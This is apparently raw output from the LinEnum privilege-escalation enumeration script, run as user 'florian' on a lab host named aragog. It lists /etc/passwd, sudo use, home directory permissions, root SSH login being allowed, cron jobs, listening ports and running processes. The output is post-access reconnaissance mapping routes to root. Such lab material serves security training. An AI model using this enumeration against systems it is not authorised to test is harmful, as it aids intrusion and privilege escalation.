root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:123:130:ftp daemon,,,:/srv/ftp:/bin/false


[-] Super user account(s):
root


[-] Accounts that have recently used sudo:
/home/florian/.sudo_as_admin_successful


[-] Are permissions on /home directories lax:
total 16K
drwxr-xr-x  4 root    root    4.0K Dec 21  2017 .
drwxr-xr-x 24 root    root    4.0K Jan 12  2018 ..
drwxrwx---  3 cliff   cliff   4.0K Dec 21  2017 cliff
drwxrwxr-x 19 florian florian 4.0K Sep  3 09:01 florian


[-] Root is allowed to login via SSH:
PermitRootLogin yes


### ENVIRONMENTAL #######################################
[-] Environment information:
SHELL=/bin/bash
TERM=xterm-256color
SSH_CLIENT=10.10.14.6 43846 22
SSH_TTY=/dev/pts/8
USER=florian
PATH=/home/florian/bin:/home/florian/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
MAIL=/var/mail/florian
QT_QPA_PLATFORMTHEME=appmenu-qt5
PWD=/home/florian
LANG=en_US.UTF-8
HOME=/home/florian
SHLVL=2
LOGNAME=florian
LC_CTYPE=en_US.UTF-8
SSH_CONNECTION=10.10.14.6 43846 10.10.10.78 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s
_=/usr/bin/env


[-] Path information:
/home/florian/bin:/home/florian/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin


[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash


[-] Current umask value:
0022
u=rwx,g=rx,o=rx


[-] umask value as specified in /etc/login.defs:
UMASK		022


[-] Password and storage information:
PASS_MAX_DAYS	99999
PASS_MIN_DAYS	0
PASS_WARN_AGE	7
ENCRYPT_METHOD SHA512


### JOBS/TASKS ##########################################
[-] Cron jobs:
-rw-r--r-- 1 root root  722 Apr  5  2016 /etc/crontab

/etc/cron.d:
total 32
drwxr-xr-x   2 root root  4096 Dec 18  2017 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rw-r--r--   1 root root   244 Dec 28  2014 anacron
-rw-r--r--   1 root root   670 Mar  1  2016 php
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rw-r--r--   1 root root   190 Dec 18  2017 popularity-contest

/etc/cron.daily:
total 76
drwxr-xr-x   2 root root  4096 Jan 12  2018 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rwxr-xr-x   1 root root   311 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root   539 Apr  5  2016 apache2
-rwxr-xr-x   1 root root   376 Mar 31  2016 apport
-rwxr-xr-x   1 root root  1474 Jun 19  2017 apt-compat
-rwxr-xr-x   1 root root   355 May 22  2012 bsdmainutils
-rwxr-xr-x   1 root root   384 Oct  5  2014 cracklib-runtime
-rwxr-xr-x   1 root root  1597 Nov 26  2015 dpkg
-rwxr-xr-x   1 root root   372 May  5  2015 logrotate
-rwxr-xr-x   1 root root  1293 Nov  6  2015 man-db
-rwxr-xr-x   1 root root   435 Nov 17  2014 mlocate
-rwxr-xr-x   1 root root   249 Nov 12  2015 passwd
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root  3449 Feb 26  2016 popularity-contest
-rwxr-xr-x   1 root root   214 May 24  2016 update-notifier-common
-rwxr-xr-x   1 root root  1046 May 19  2016 upstart

/etc/cron.hourly:
total 20
drwxr-xr-x   2 root root  4096 Aug  1  2017 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.monthly:
total 24
drwxr-xr-x   2 root root  4096 Aug  1  2017 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rwxr-xr-x   1 root root   313 Dec 28  2014 0anacron
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder

/etc/cron.weekly:
total 36
drwxr-xr-x   2 root root  4096 Jan 12  2018 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rwxr-xr-x   1 root root   312 Dec 28  2014 0anacron
-rwxr-xr-x   1 root root    86 Apr 13  2016 fstrim
-rwxr-xr-x   1 root root   771 Nov  6  2015 man-db
-rw-r--r--   1 root root   102 Apr  5  2016 .placeholder
-rwxr-xr-x   1 root root   211 May 24  2016 update-notifier-common


[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


[-] Anacron jobs and associated file permissions:
-rw-r--r-- 1 root root 401 Dec 28  2014 /etc/anacrontab
# /etc/anacrontab: configuration file for anacron

# See anacron(8) and anacrontab(5) for details.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
HOME=/root
LOGNAME=root

# These replace cron's entries
1	5	cron.daily	run-parts --report /etc/cron.daily
7	10	cron.weekly	run-parts --report /etc/cron.weekly
@monthly	15	cron.monthly	run-parts --report /etc/cron.monthly


[-] When were jobs last executed (/var/spool/anacron contents):
total 20
drwxr-xr-x 2 root root 4096 Dec 18  2017 .
drwxr-xr-x 7 root root 4096 Aug  1  2017 ..
-rw------- 1 root root    9 Sep  3 07:35 cron.daily
-rw------- 1 root root    9 Sep  2 17:18 cron.monthly
-rw------- 1 root root    9 Sep  2 17:13 cron.weekly


### NETWORKING  ##########################################
[-] Network and IP info:
ens33     Link encap:Ethernet  HWaddr 00:50:56:8f:18:18
          inet addr:10.10.10.78  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:fe8f:1818/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:fe8f:1818/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1722509 errors:0 dropped:21 overruns:0 frame:0
          TX packets:1264440 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:159797409 (159.7 MB)  TX bytes:285653289 (285.6 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:333732 errors:0 dropped:0 overruns:0 frame:0
          TX packets:333732 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:26776092 (26.7 MB)  TX bytes:26776092 (26.7 MB)


[-] ARP history:
? (10.10.10.2) at 00:50:56:b9:92:97 [ether] on ens33


[-] Default route:
default         10.10.10.2      0.0.0.0         UG    0      0        0 ens33


[-] Listening TCP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43456         127.0.0.1:80            TIME_WAIT   -
tcp        0  15744 10.10.10.78:22          10.10.14.6:43846        ESTABLISHED -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::21                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:631                 :::*                    LISTEN      -


[-] Listening UDP:
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -
udp        0      0 0.0.0.0:60503           0.0.0.0:*                           -
udp        0      0 0.0.0.0:631             0.0.0.0:*                           -
udp6       0      0 :::5353                 :::*                                -
udp6       0      0 :::37271                :::*                                -


### SERVICES #############################################
[-] Running processes:
USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root          1  0.0  0.4 119592  4120 ?        Ss   Sep02   0:03 /sbin/init auto noprompt
root          2  0.0  0.0      0     0 ?        S    Sep02   0:00 [kthreadd]
root          4  0.0  0.0      0     0 ?        S<   Sep02   0:00 [kworker/0:0H]
root          6  0.0  0.0      0     0 ?        S<   Sep02   0:00 [mm_percpu_wq]
root          7  0.0  0.0      0     0 ?        S    Sep02   0:04 [ksoftirqd/0]
root          8  0.0  0.0      0     0 ?        S    Sep02   0:02 [rcu_sched]
root          9  0.0  0.0      0     0 ?        S    Sep02   0:00 [rcu_bh]
root         10  0.0  0.0      0     0 ?        S    Sep02   0:00 [migration/0]
root         11  0.0  0.0      0     0 ?        S    Sep02   0:00 [watchdog/0]
root         12  0.0  0.0      0     0 ?        S    Sep02   0:00 [cpuhp/0]
root         13  0.0  0.0      0     0 ?        S    Sep02   0:00 [kdevtmpfs]
root         14  0.0  0.0      0     0 ?        S<   Sep02   0:00 [netns]
root         15  0.0  0.0      0     0 ?        S    Sep02   0:00 [khungtaskd]
root         16  0.0  0.0      0     0 ?        S    Sep02   0:00 [oom_reaper]
root         17  0.0  0.0      0     0 ?        S<   Sep02   0:00 [writeback]
root         18  0.0  0.0      0     0 ?        S    Sep02   0:00 [kcompactd0]
root         19  0.0  0.0      0     0 ?        SN   Sep02   0:00 [ksmd]
root         20  0.0  0.0      0     0 ?        SN   Sep02   0:01 [khugepaged]
root         21  0.0  0.0      0     0 ?        S<   Sep02   0:00 [crypto]
root         22  0.0  0.0      0     0 ?        S<   Sep02   0:00 [kintegrityd]
root         23  0.0  0.0      0     0 ?        S<   Sep02   0:00 [kblockd]
root         24  0.0  0.0      0     0 ?        S<   Sep02   0:00 [ata_sff]
root         25  0.0  0.0      0     0 ?        S<   Sep02   0:00 [md]
root         26  0.0  0.0      0     0 ?        S<   Sep02   0:00 [edac-poller]
root         27  0.0  0.0      0     0 ?        S<   Sep02   0:00 [devfreq_wq]
root         28  0.0  0.0      0     0 ?        S<   Sep02   0:00 [watchdogd]
root         32  0.0  0.0      0     0 ?        S    Sep02   0:00 [kauditd]
root         33  0.0  0.0      0     0 ?        S    Sep02   0:02 [kswapd0]
root         34  0.0  0.0      0     0 ?        S    Sep02   0:00 [ecryptfs-kthrea]
root         76  0.0  0.0      0     0 ?        S<   Sep02   0:00 [kthrotld]
root         77  0.0  0.0      0     0 ?        S<   Sep02   0:00 [acpi_thermal_pm]
root         78  0.0  0.0      0     0 ?        S    Sep02   0:00 [scsi_eh_0]
root         79  0.0  0.0      0     0 ?        S<   Sep02   0:00 [scsi_tmf_0]
root         80  0.0  0.0      0     0 ?        S    Sep02   0:00 [scsi_eh_1]
root         81  0.0  0.0      0     0 ?        S<   Sep02   0:00 [scsi_tmf_1]
root         87  0.0  0.0      0     0 ?        S<   Sep02   0:00 [ipv6_addrconf]
root        113  0.0  0.0      0     0 ?        S<   Sep02   0:00 [charger_manager]
root        170  0.0  0.0      0     0 ?        S    Sep02   0:00 [scsi_eh_2]
root        171  0.0  0.0      0     0 ?        S<   Sep02   0:00 [scsi_tmf_2]
root        172  0.0  0.0      0     0 ?        S<   Sep02   0:00 [vmw_pvscsi_wq_2]
root        174  0.0  0.0      0     0 ?        S<   Sep02   0:00 [ttm_swap]
root        176  0.0  0.0      0     0 ?        S<   Sep02   0:01 [kworker/0:1H]
root        198  0.0  0.0      0     0 ?        S    Sep02   0:01 [jbd2/sda1-8]
root        199  0.0  0.0      0     0 ?        S<   Sep02   0:00 [ext4-rsv-conver]
root        232  0.0  0.1  28412  1824 ?        Ss   Sep02   0:01 /lib/systemd/systemd-journald
root        257  0.0  0.0 158624    88 ?        Ssl  Sep02   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
root        261  0.0  0.1  45668  1740 ?        Ss   Sep02   0:00 /lib/systemd/systemd-udevd
systemd+    341  0.0  0.0 102384   116 ?        Ssl  Sep02   0:04 /lib/systemd/systemd-timesyncd
root        435  0.0  0.0      0     0 ?        S<   Sep02   0:00 [nfit]
avahi       660  0.0  0.0  44908   400 ?        Ss   Sep02   0:00 avahi-daemon: running [aragog.local]
root        661  0.0  0.0   4396     0 ?        Ss   Sep02   0:00 /usr/sbin/acpid
root        664  0.0  0.1  28676  1584 ?        Ss   Sep02   0:00 /lib/systemd/systemd-logind
root        676  0.0  0.3 185860  3032 ?        Ssl  Sep02   0:40 /usr/bin/vmtoolsd
message+    680  0.0  0.2  43640  2144 ?        Ss   Sep02   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root        733  0.0  0.1  29008   988 ?        Ss   Sep02   0:00 /usr/sbin/cron -f
root        737  0.0  0.3 375212  3884 ?        Ssl  Sep02   0:00 /usr/sbin/NetworkManager --no-daemon
root        741  0.0  0.2 337392  2180 ?        Ssl  Sep02   0:00 /usr/sbin/ModemManager
root        743  0.0  0.3 278996  3524 ?        Ssl  Sep02   0:02 /usr/lib/snapd/snapd
syslog      747  0.0  0.0 256392   844 ?        Ssl  Sep02   0:00 /usr/sbin/rsyslogd -n
root        750  0.0  0.3 275876  3428 ?        Ssl  Sep02   0:01 /usr/lib/accountsservice/accounts-daemon
avahi       766  0.0  0.0  44784    60 ?        S    Sep02   0:00 avahi-daemon: chroot helper
root        799  0.0  0.0  15936   112 tty1     Ss+  Sep02   0:00 /sbin/agetty --noclear tty1 linux
root        834  0.0  0.0 350380   556 ?        Ssl  Sep02   0:00 /usr/sbin/lightdm
root        856  0.0  0.4 278964  4084 ?        Ssl  Sep02   0:00 /usr/lib/policykit-1/polkitd --no-debug
root        922  0.0  0.1  65516  1436 ?        Ss   Sep02   0:00 /usr/sbin/sshd -D
root        924  0.0  0.0  24044   780 ?        Ss   Sep02   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
root        935  0.0  0.9 329368  9492 tty7     Ssl+ Sep02   0:01 /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
mysql       947  0.0  4.8 1116308 48052 ?       Ssl  Sep02   0:31 /usr/sbin/mysqld
whoopsie    964  0.0  0.1 269228  1828 ?        Ssl  Sep02   0:00 /usr/bin/whoopsie -f
root       1004  0.0  0.1 226180  1772 ?        Sl   Sep02   0:00 lightdm --session-child 16 19
lightdm    1010  0.0  0.2  45276  2312 ?        Ss   Sep02   0:00 /lib/systemd/systemd --user
lightdm    1011  0.0  0.0  63208   392 ?        S    Sep02   0:00 (sd-pam)
lightdm    1019  0.0  0.0   4504     0 ?        Ss   Sep02   0:00 /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter
lightdm    1038  0.0  0.0  43000   288 ?        Ss   Sep02   0:00 /usr/bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session
lightdm    1039  0.0  1.1 937532 11588 ?        Sl   Sep02   0:02 /usr/sbin/unity-greeter
lightdm    1041  0.0  0.0 337984   512 ?        Sl   Sep02   0:00 /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately
lightdm    1046  0.0  0.0  42764   124 ?        S    Sep02   0:00 /usr/bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3
root       1065  0.0  2.8 317752 28548 ?        Ss   Sep02   0:03 /usr/sbin/apache2 -k start
lightdm    1074  0.0  0.0 206968   448 ?        Sl   Sep02   0:00 /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
lightdm    1078  0.0  0.0 274416   528 ?        Sl   Sep02   0:00 /usr/lib/gvfs/gvfsd
lightdm    1085  0.0  0.0 341328     0 ?        Sl   Sep02   0:00 /usr/lib/gvfs/gvfsd-fuse /run/user/108/gvfs -f -o big_writes
lightdm    1103  0.0  0.1 178532  1296 ?        Sl   Sep02   0:00 /usr/lib/dconf/dconf-service
root       1133  0.0  0.0  82708   572 ?        S    Sep02   0:00 lightdm --session-child 12 19
lightdm    1136  0.0  1.8 708056 18284 ?        Sl   Sep02   0:01 /usr/bin/python3 /usr/bin/onboard --xid
lightdm    1143  0.0  0.2  45956  2420 ?        S    Sep02   0:00 upstart --user --startup-event indicator-services-start
lightdm    1147  0.0  0.6 593644  6620 ?        Sl   Sep02   0:00 nm-applet
lightdm    1151  0.0  0.6 627104  6388 ?        Sl   Sep02   0:00 /usr/lib/unity-settings-daemon/unity-settings-daemon
lightdm    1153  0.0  0.3 354380  3344 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-messages/indicator-messages-service
lightdm    1154  0.0  0.0 407100   380 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
lightdm    1155  0.0  0.2 437060  2044 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-power/indicator-power-service
lightdm    1156  0.0  0.4 531624  4144 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-datetime/indicator-datetime-service
lightdm    1157  0.0  1.3 563720 13696 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-keyboard/indicator-keyboard-service --use-gtk
lightdm    1158  0.0  0.4 737036  3992 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-sound/indicator-sound-service
lightdm    1159  0.0  0.2 625048  2564 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-session/indicator-session-service
lightdm    1166  0.0  0.1 403148  1556 ?        Ssl  Sep02   0:00 /usr/lib/x86_64-linux-gnu/indicator-application/indicator-application-service
root       1206  0.0  0.1 347124  1772 ?        Ssl  Sep02   0:00 /usr/lib/upower/upowerd
lightdm    1222  0.0  0.1 416292  1476 ?        S<l  Sep02   0:00 /usr/bin/pulseaudio --start --log-target=syslog
rtkit      1223  0.0  0.0 183544   460 ?        SNsl Sep02   0:00 /usr/lib/rtkit/rtkit-daemon
colord     1235  0.0  0.0 301088   572 ?        Ssl  Sep02   0:00 /usr/lib/colord/colord
root      18196  0.0  0.0      0     0 ?        S    07:35   0:02 [kworker/0:3]
root      18203  0.0  0.7  93276  7368 ?        Ss   07:35   0:00 /usr/sbin/cupsd -l
root      18204  0.0  0.9 274816  9724 ?        Ssl  07:35   0:00 /usr/sbin/cups-browsed
root      18827  0.0  0.0      0     0 ?        S    08:07   0:00 [kworker/u256:0]
root      19250  0.0  0.0      0     0 ?        S    08:29   0:00 [kworker/u256:2]
root      19345  0.0  0.6  68076  6084 ?        Ss   08:32   0:00 sshd: florian [priv]
florian   19347  0.0  0.3  68076  3128 ?        S    08:33   0:00 sshd: florian@pts/8
florian   19355  0.0  0.5  22632  5292 pts/8    Ss   08:33   0:00 -bash
root      19774  0.0  0.0      0     0 ?        S    08:46   0:00 [kworker/0:0]
root      19976  0.0  0.0      0     0 ?        S    08:57   0:00 [kworker/u256:1]
www-data  19990  0.0  0.8 317824  8256 ?        S    08:58   0:00 /usr/sbin/apache2 -k start
www-data  19996  0.0  3.5 324824 34664 ?        S    08:58   0:00 /usr/sbin/apache2 -k start
www-data  20013  0.0  0.8 317824  8256 ?        S    08:59   0:00 /usr/sbin/apache2 -k start
www-data  20015  0.0  0.8 317824  8256 ?        S    08:59   0:00 /usr/sbin/apache2 -k start
www-data  20018  0.0  0.8 317824  8256 ?        S    08:59   0:00 /usr/sbin/apache2 -k start
www-data  20021  0.2  4.6 326788 45964 ?        S    08:59   0:00 /usr/sbin/apache2 -k start
www-data  20042  0.0  0.8 317824  8256 ?        S    09:00   0:00 /usr/sbin/apache2 -k start
www-data  20043  0.0  0.8 317824  8256 ?        S    09:00   0:00 /usr/sbin/apache2 -k start
www-data  20044  0.0  0.8 317824  8256 ?        S    09:00   0:00 /usr/sbin/apache2 -k start
www-data  20046  0.0  0.8 317776  8256 ?        S    09:00   0:00 /usr/sbin/apache2 -k start
florian   20058  0.0  0.4  13584  4000 pts/8    S+   09:01   0:00 bash LinEnum.sh
florian   20059  0.0  0.3  13640  3496 pts/8    S+   09:01   0:00 bash LinEnum.sh
florian   20060  0.0  0.0   7296   700 pts/8    S+   09:01   0:00 tee -a
florian   20265  0.0  0.2  13640  2876 pts/8    S+   09:01   0:00 bash LinEnum.sh
florian   20266  0.0  0.3  37364  3260 pts/8    R+   09:01   0:00 ps aux


[-] Process binaries and associated permissions (from above list):
   0 lrwxrwxrwx 1 root root    4 Dec 18  2017 /bin/sh -> dash
1.6M -rwxr-xr-x 1 root root 1.6M Oct 27  2017 /lib/systemd/systemd
320K -rwxr-xr-x 1 root root 319K Oct 27  2017 /lib/systemd/systemd-journald
608K -rwxr-xr-x 1 root root 605K Oct 27  2017 /lib/systemd/systemd-logind
140K -rwxr-xr-x 1 root root 139K Oct 27  2017 /lib/systemd/systemd-timesyncd
444K -rwxr-xr-x 1 root root 443K Oct 27  2017 /lib/systemd/systemd-udevd
 44K -rwxr-xr-x 1 root root  44K Jun 14  2017 /sbin/agetty
   0 lrwxrwxrwx 1 root root   20 Oct 27  2017 /sbin/init -> /lib/systemd/systemd
220K -rwxr-xr-x 1 root root 219K Jan 12  2017 /usr/bin/dbus-daemon
 88K -rwxr-xr-x 1 root root  87K Nov 15  2017 /usr/bin/pulseaudio
   0 lrwxrwxrwx 1 root root    9 Dec 18  2017 /usr/bin/python3 -> python3.5
 44K -rwxr-xr-x 1 root root  44K Feb  9  2017 /usr/bin/vmtoolsd
 56K -rwxr-xr-x 1 root root  56K Jul 27  2017 /usr/bin/whoopsie
164K -rwxr-xr-x 1 root root 162K Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
 88K -rwxr-xr-x 1 root root  86K Feb 24  2016 /usr/lib/at-spi2-core/at-spi2-registryd
 24K -rwxr-xr-x 1 root root  22K Feb 24  2016 /usr/lib/at-spi2-core/at-spi-bus-launcher
288K -rwxr-xr-x 1 root root 287K Nov  6  2015 /usr/lib/colord/colord
 80K -rwxr-xr-x 1 root root  77K May 26  2015 /usr/lib/dconf/dconf-service
 32K -rwxr-xr-x 1 root root  32K Aug 17  2017 /usr/lib/gvfs/gvfsd
 36K -rwxr-xr-x 1 root root  36K Aug 17  2017 /usr/lib/gvfs/gvfsd-fuse
 16K -rwxr-xr-x 1 root root  15K Jan 17  2016 /usr/lib/policykit-1/polkitd
 64K -rwxr-xr-x 1 root root  64K Oct 25  2015 /usr/lib/rtkit/rtkit-daemon
 21M -rwxr-xr-x 1 root root  21M Nov 30  2017 /usr/lib/snapd/snapd
 40K -rwxr-xr-x 1 root root  40K Jul  1  2016 /usr/lib/unity-settings-daemon/unity-settings-daemon
224K -rwxr-xr-x 1 root root 223K Jun 15  2016 /usr/lib/upower/upowerd
 44K -rwxr-xr-x 1 root root  44K Jan 20  2017 /usr/lib/x86_64-linux-gnu/indicator-application/indicator-application-service
 88K -rwxr-xr-x 1 root root  88K May 26  2016 /usr/lib/x86_64-linux-gnu/indicator-bluetooth/indicator-bluetooth-service
1.2M -rwxr-xr-x 1 root root 1.2M Apr  6  2016 /usr/lib/x86_64-linux-gnu/indicator-datetime/indicator-datetime-service
140K -rwxr-xr-x 1 root root 137K Nov 25  2015 /usr/lib/x86_64-linux-gnu/indicator-keyboard/indicator-keyboard-service
116K -rwxr-xr-x 1 root root 113K May  5  2015 /usr/lib/x86_64-linux-gnu/indicator-messages/indicator-messages-service
168K -rwxr-xr-x 1 root root 165K Jan  5  2016 /usr/lib/x86_64-linux-gnu/indicator-power/indicator-power-service
368K -rwxr-xr-x 1 root root 365K Apr 12  2016 /usr/lib/x86_64-linux-gnu/indicator-session/indicator-session-service
304K -rwxr-xr-x 1 root root 301K Apr  7  2016 /usr/lib/x86_64-linux-gnu/indicator-sound/indicator-sound-service
2.3M -rwxr-xr-x 1 root root 2.3M Nov 24  2017 /usr/lib/xorg/Xorg
 48K -rwxr-xr-x 1 root root  47K Apr  8  2016 /usr/sbin/acpid
648K -rwxr-xr-x 1 root root 647K Sep 18  2017 /usr/sbin/apache2
 44K -rwxr-xr-x 1 root root  44K Apr  5  2016 /usr/sbin/cron
148K -rwxr-xr-x 1 root root 145K Aug 22  2016 /usr/sbin/cups-browsed
408K -rwxr-xr-x 1 root root 407K Aug 22  2017 /usr/sbin/cupsd
252K -rwxr-xr-x 1 root root 249K Mar 31  2017 /usr/sbin/lightdm
1.1M -rwxr-xr-x 1 root root 1.1M Nov  4  2015 /usr/sbin/ModemManager
 24M -rwxr-xr-x 1 root root  24M Oct 18  2017 /usr/sbin/mysqld
2.9M -rwxr-xr-x 1 root root 2.9M Nov 16  2017 /usr/sbin/NetworkManager
588K -rwxr-xr-x 1 root root 586K Apr  5  2016 /usr/sbin/rsyslogd
784K -rwxr-xr-x 1 root root 781K Mar 16  2017 /usr/sbin/sshd
392K -rwxr-xr-x 1 root root 392K Mar 23  2016 /usr/sbin/unity-greeter
168K -rwxr-xr-x 1 root root 165K Apr 13  2016 /usr/sbin/vsftpd


[-] /etc/init.d/ binary permissions:
total 356
drwxr-xr-x   2 root root  4096 Jan 12  2018 .
drwxr-xr-x 134 root root 12288 Jan 18  2018 ..
-rwxr-xr-x   1 root root  2243 Feb  9  2016 acpid
-rwxr-xr-x   1 root root  5336 Apr 14  2016 alsa-utils
-rwxr-xr-x   1 root root  2014 Dec 28  2014 anacron
-rwxr-xr-x   1 root root  8087 Apr  5  2016 apache2
-rwxr-xr-x   1 root root  2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x   1 root root  6223 Mar  3  2017 apparmor
-rwxr-xr-x   1 root root  2802 Nov 17  2017 apport
-rwxr-xr-x   1 root root  2401 Nov  4  2015 avahi-daemon
-rwxr-xr-x   1 root root  2968 Mar  1  2016 bluetooth
-rwxr-xr-x   1 root root  1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x   1 root root  2125 Apr 27  2016 brltty
-rwxr-xr-x   1 root root  3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x   1 root root  1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x   1 root root  9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x   1 root root  1343 Apr  4  2016 console-setup
-rwxr-xr-x   1 root root  3049 Apr  5  2016 cron
-rwxr-xr-x   1 root root  2816 Feb 13  2016 cups
-rwxr-xr-x   1 root root  1961 Feb 13  2016 cups-browsed
-rwxr-xr-x   1 root root  2813 Dec  1  2015 dbus
